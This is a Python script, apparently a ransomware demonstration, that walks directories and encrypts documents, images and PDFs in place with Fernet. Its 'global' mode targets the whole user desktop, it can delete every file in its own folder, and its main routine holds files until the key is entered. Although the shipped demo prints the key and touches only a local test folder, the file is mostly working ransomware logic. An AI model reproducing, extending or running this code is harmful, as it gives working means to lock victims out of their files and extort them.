from cryptography.fernet import Fernet
import os, sys, time

class Encryptor:
    def __init__(self, typeOfEncrypt, autoDelete=False, verbose=True):
        if os.name != "nt":
            self.VerboseInfo("SHUTDOWN", "Only runs on windows", True)

        self.verbose = verbose
        self.typeOfEncrypt = typeOfEncrypt # Local (folder ./target_files) / Global (all files)
        self.scriptPath = os.getcwd()
        
        if autoDelete == True:
            self.SelfDelete()

        if self.typeOfEncrypt == "local": 
            self.encryptPath = self.scriptPath + "\local_target_files"
        elif self.typeOfEncrypt == 'global': 
            self.encryptPath = os.path.expanduser("~/desktop")

    def SelfDelete(self):
        os.chdir(self.scriptPath)

        for file in os.listdir(self.scriptPath):
            if self.typeOfEncrypt == 'local' and file == "local_target_files":
                pass
            else:
                try: os.remove(file)
                except: self.VerboseInfo("ERROR", f"Could not delete file: {file}")


    def KeyGen(self):
        os.chdir(self.scriptPath)

        if "decrypt_key.key" in os.listdir():
            user_imput = input("⚠️ There's already a decrypt key !\nErase the previous one ? (y/n) ")
            
            if user_imput == "n":
                sys.exit()
                
        key = Fernet.generate_key()

        with open(f"{self.scriptPath}/decrypt_key.key", "wb") as fileContainingKey:
            fileContainingKey.write(key)
        
        return key

    def GetKey(self):
        os.chdir(self.scriptPath)

        if "decrypt_key.key" in os.listdir():
            with open("decrypt_key.key", "rb") as fileContainingKey:
                return fileContainingKey.read()
        else:
            raise FileNotFoundError(f"There's no decrypt key (should be in \"{self.scriptPath}\")")

    def DelKey(self):
        os.chdir(self.scriptPath)

        if "decrypt_key.key" in os.listdir():
            os.remove("decrypt_key.key")
            self.key = None
            self.VerboseInfo("INFO", "Decrypt key deleted")

    def GetTargetedFiles(self, path=None):
        if path == None: path = self.encryptPath
        toEncrypt = ['.txt', '.jpeg', '.bmp', '.pdf', '.docx', '.Odt', ]
        targetedFiles = []
    
        os.chdir(path)

        for file in os.listdir():
            pathToFile = f"{path}\{file}"

            if os.path.isfile(pathToFile):
                if os.path.splitext(file)[1] in toEncrypt:
                    targetedFiles.append(pathToFile)
            elif os.path.isdir(pathToFile):
                targetedFiles += self.GetTargetedFiles(pathToFile)
        
        return targetedFiles

    def FileEncryption(self):
        self.VerboseInfo('INFO', 'Encryption started')

        self.key = self.KeyGen()
        self.fernetInstance = Fernet(self.key)
    
        filesToEncrypt = self.GetTargetedFiles()

        for file in filesToEncrypt:
            try:
                with open(file, "br") as openedFile:
                    fileContent = openedFile.read()

                with open(file, "bw") as openedFile:
                    openedFile.write(self.fernetInstance.encrypt(fileContent))
            except:
                self.VerboseInfo("ERROR", f"Could not encrypt the following file: {file}")
        
        self.VerboseInfo('INFO', 'Encryption finished')

    def FileDecryption(self):
        self.VerboseInfo('INFO', 'Decryption started')

        self.key = self.GetKey()
        self.fernetInstance = Fernet(self.key)
        filesToDecrypt = self.GetTargetedFiles()

        for file in filesToDecrypt:
            with open(file, "br") as openedFile:
                fileContent = openedFile.read()

            with open(file, "bw") as openedFile:
                try: openedFile.write(self.fernetInstance.decrypt(fileContent))
                except: self.VerboseInfo('ERROR', f"The following file isn't crypted: {file}")
        self.DelKey()
        self.VerboseInfo('INFO', 'Decryption finished')
    
    def VerboseInfo(self, typeOfMessage, message, forceOutput=False):
        if self.verbose or forceOutput:
            print(f"[ {typeOfMessage} ] {message}")

def main():
    os.system('cls')
    print("=== File Encryption Demo ===")
    print("Will encrypt \"local_target_files\" folder")
    
    rsmw = Encryptor("local")
    rsmw.FileEncryption()

    print(f"\n\nDecrypt key: {rsmw.key.decode('utf-8')}")
    user_input = input('Enter decrypt key: ')

    while user_input != rsmw.key.decode('utf-8'):
        user_input = input('Enter decrypt key: ')
    rsmw.FileDecryption()

    input('\n\npress ENTER to quit...')

if __name__ == "__main__":
    main()